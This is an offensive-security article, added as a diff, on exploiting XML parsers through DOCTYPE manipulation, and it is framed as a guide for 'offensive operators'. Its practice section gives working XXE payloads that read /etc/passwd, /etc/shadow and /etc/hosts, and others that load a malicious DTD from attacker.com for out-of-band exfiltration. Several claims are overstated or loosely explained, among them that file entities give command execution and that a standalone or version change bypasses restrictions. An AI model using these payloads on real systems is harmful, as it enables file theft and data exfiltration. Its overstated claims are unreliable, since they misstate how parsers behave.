@@ -1,0 +1,120 @@
+---
+title: Advanced DOCTYPE Manipulation Techniques
+description: Explore how to leverage DOCTYPE manipulation for XML parser exploitation
+  and security bypassing in web applications.
+keywords:
+- DOCTYPE manipulation
+- XXE exploitation
+- XML parser bypass
+- internal subset
+- external subset
+- mixed content model
+- DTD injection
+- standalone declaration bypass
+---
+
+# DOCTYPE Manipulation
+
+## Context
+
+The purpose of this article is to enable offensive operators to exploit weaknesses in XML parsers using advanced DOCTYPE manipulation, a technique often employed for evasion and bypass. Readers should have a foundational understanding of XML structures and syntax, the basics of Document Type Definitions (DTD), and the XML parsing process. Familiarity with standard XML External Entity (XXE) exploitation will be beneficial.
+
+## Theory
+
+### Role of DOCTYPE in XML Parsing
+
+DOCTYPE declarations play a crucial role in defining the DTD for an XML document. They control how entities are declared and how the document is validated. By manipulating DOCTYPE, attackers can significantly alter parser behavior, potentially bypassing security controls intended to prevent unauthorized access or data leakage.
+
+### Internal vs. External Subsets in DOCTYPE
+
+DOCTYPE can have either internal or external subsets. 
+
+- **Internal subset** defines DTD declarations within the XML document itself.
+- **External subset** refers to DTD declarations that are loaded from an external resource.
+
+Parsers may handle these subsets differently, which can lead to inconsistent security enforcement. This inconsistency can be leveraged by attackers to perform unauthorized actions.
+
+### Advanced DOCTYPE Manipulation Techniques
+
+Crafting specific attack sequences involves injecting custom internal subsets to redefine or introduce entities for exploitation. Additionally, leveraging external subsets allows for loading malicious DTDs from attacker-controlled servers. Some parsers may overlook security settings when parsing complex or deeply nested DOCTYPE declarations, creating potential vulnerabilities.
+
+### Evasion via Mixed Content Models and Fragment Injection
+
+Attackers can embed malicious DTD fragments within mixed content models, which can bypass static security filters. The strategy involves splitting DTD payloads across multiple XML elements or attributes to evade detection.
+
+### Bypassing with Standalone and XML Declarations
+
+Manipulating standalone or XML declarations can influence parser behavior, effectively bypassing existing security restrictions. This manipulation becomes a tool for attackers to ensure that the parser processes the DTDs despite restrictive environmental settings.
+
+## Practice
+
+### Internal Subset DOCTYPE Injection
+
+- **Payload:**
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <root>&xxe;</root>
+  ```
+- **Explanation:** This payload injects a malicious internal subset to define an XXE entity capable of arbitrary file read or command execution.
+- **Outcome:** Exploiting internal DTD manipulation may result in the unauthorized reading of sensitive files or execution of commands on the target server.
+
+### External Subset DOCTYPE Reference
+
+- **Payload:**
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root SYSTEM "http://attacker.com/malicious.dtd">
+  <root>&xxe;</root>
+  ```
+- **Explanation:** An attacker-controlled external DTD is referenced to introduce malicious entities.
+- **Outcome:** Remote DTD loads can enable advanced XXE attacks or out-of-band data exfiltration.
+
+### Mixed Content Model DTD Fragment Injection
+
+- **Payload:**
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [
+  <!ELEMENT root (#PCDATA|foo)*>
+  <!ENTITY % dtd SYSTEM "http://attacker.com/fragment.dtd">
+  %dtd;
+  ]>
+  <root>test</root>
+  ```
+- **Explanation:** The payload injects DTD fragments via mixed content to evade static security filters.
+- **Outcome:** This approach can bypass input validation, enabling DTD-based attacks that remain undetected by conventional filters.
+
+### Standalone Declaration Bypass
+
+- **Payload:**
+  ```xml
+  <?xml version="1.0" standalone="no"?>
+  <!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+  ]>
+  <root>&xxe;</root>
+  ```
+- **Explanation:** By altering the standalone declaration, this technique influences the parser's processing of DTDs.
+- **Outcome:** The parser may process DTDs despite restrictive settings, allowing for the execution of unauthorized actions.
+
+### XML Declaration Manipulation
+
+- **Payload:**
+  ```xml
+  <?xml version="1.1"?>
+  <!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+  ]>
+  <root>&xxe;</root>
+  ```
+- **Explanation:** This tactic changes the XML version to bypass version-specific parser restrictions.
+- **Outcome:** It can bypass version-based input validation or parser restrictions, permitting exploitation activities.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **XXEinjector** 
